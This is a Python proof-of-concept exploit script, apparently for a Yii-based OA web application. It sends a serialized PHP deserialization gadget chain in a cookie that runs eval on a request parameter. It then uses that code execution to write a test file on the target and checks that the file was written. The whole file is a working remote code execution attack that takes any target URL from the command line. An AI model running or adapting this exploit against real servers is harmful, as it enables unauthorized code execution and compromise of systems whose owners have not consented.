#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/general/appbuilder/web/portal/gateway/moare?a=1"
    burp0_cookies = {"_COOKIE": "8a987cdbe51b7fe8c0efaf47430b18b96a1477de4a08291eef0f7164bd1b5a9cO%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A17%3A%22yii%5Cdb%5CDataReader%22%3A1%3A%7Bs%3A29%3A%22%00yii%5Cdb%5CDataReader%00_statement%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A8%3A%7Bs%3A32%3A%22%00yii%5Credis%5CConnection%00unixSocket%22%3Bi%3A0%3Bs%3A8%3A%22hostname%22%3Bs%3A13%3A%22www.baidu.com%22%3Bs%3A4%3A%22port%22%3Bs%3A3%3A%22443%22%3Bs%3A17%3A%22connectionTimeout%22%3Bi%3A30%3Bs%3A29%3A%22%00yii%5Credis%5CConnection%00_socket%22%3Bb%3A0%3Bs%3A8%3A%22database%22%3BN%3Bs%3A13%3A%22redisCommands%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22CLOSE+CURSOR%22%3B%7Ds%3A27%3A%22%00yii%5Cbase%5CComponent%00_events%22%3Ba%3A1%3A%7Bs%3A9%3A%22afterOpen%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A32%3A%22yii%5Ccaching%5CExpressionDependency%22%3A2%3A%7Bs%3A10%3A%22expression%22%3Bs%3A23%3A%22eval%28%24_REQUEST%5B%27img%27%5D%29%3B%22%3Bs%3A8%3A%22reusable%22%3Bb%3A0%3B%7Di%3A1%3Bs%3A9%3A%22isChanged%22%3B%7Di%3A1%3Bs%3A1%3A%22a%22%3B%7D%7D%7D%7D%7D%7D"}
    burp0_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    burp0_data = {"img": "file_put_contents(\"../../vulntest.txt\",\"vulntest\");"}
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, verify=False)
    shellpath = site + "/general/vulntest.txt"
    r2 = requests.get(shellpath, verify=False)
    if r2.status_code == 200 and "vulntest" in r2.text:
        return shellpath
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，文件上传后的路径为：", info)
    else:
        print("[-]漏洞不存在")
